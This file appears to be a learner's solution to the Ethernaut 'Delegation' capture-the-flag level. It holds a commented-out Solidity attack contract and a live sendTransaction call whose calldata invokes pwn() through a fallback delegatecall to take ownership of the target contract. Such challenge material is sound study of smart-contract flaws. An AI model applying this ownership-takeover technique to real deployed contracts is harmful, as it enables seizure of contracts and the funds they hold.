
/* contract Attak { */
/*     //address public victimContract */
/*     constructor(address victim) public { */
/*         //victimContract = victim; */
/*         // this will set Delegation's owner to msg.sender (me!) */
/*         // This works because we preserve the context of Attak (i.e. msg.sender) and have */
/*         // a fallback function that just transparently calls delegatecall, passing along */
/*         // msg.data, which will have the ABI signature of "pwn()", which sets owner = msg.sender. */
/*         victim.call(abi.encodeWithSignature("pwn()")); */
/*     } */
/* } */

// This is what I went with, cheating off of https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4
// I tried many permutatations of sha3/kaccak256/abi.encode/abi.encodeWithSignature/call/delegatecall .... I don't have it figured out yet. But I get the blog post.
//


await sendTransaction({
  from: "0xafe8d48DeFC7B96912C638C8900CB71dDB1acEC4",
  to: "0x570f892b1159BF8C8042E6EaB0b75fc5e1BD6cd2",
  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
});
